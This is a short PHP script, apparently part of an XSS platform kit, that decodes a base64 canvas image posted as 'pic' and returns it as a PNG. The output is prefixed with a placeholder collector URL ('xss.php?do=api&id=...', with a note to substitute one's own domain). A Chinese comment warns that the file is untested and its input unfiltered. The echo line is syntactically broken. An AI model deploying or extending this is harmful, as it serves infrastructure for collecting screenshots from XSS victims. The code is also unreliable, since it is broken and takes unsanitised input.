<?php
//【注意】【注意】【注意】 文件并未做测试，大家自测此文件，，，注意下方参数没有做过滤。
$html_canvas = $_POST['pic'];
$image = base64_decode(substr($html_canvas, 22));
header('Content-Type: image/png');
echo "http://替换成你的域名/xss.php?do=api&id={wyTQMo}"$image;
?>